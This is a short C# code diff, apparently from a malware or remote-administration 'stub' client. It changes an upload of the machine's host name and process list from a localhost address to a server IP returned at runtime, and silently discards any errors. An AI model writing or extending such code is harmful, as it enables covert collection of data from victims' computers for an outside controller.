@@ -18,7 +18,7 @@ namespace stub
             try
             {
                 webclient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                webclient.UploadString("http://127.0.0.1/processlist.php", "client=" + Dns.GetHostName() + "&pclist=" + pclist);
+                webclient.UploadString("http://" + ConnectionIPHandler.GetIP() + "/processlist.php", "client=" + Dns.GetHostName() + "&pclist=" + pclist);
             }
             catch { }
         }
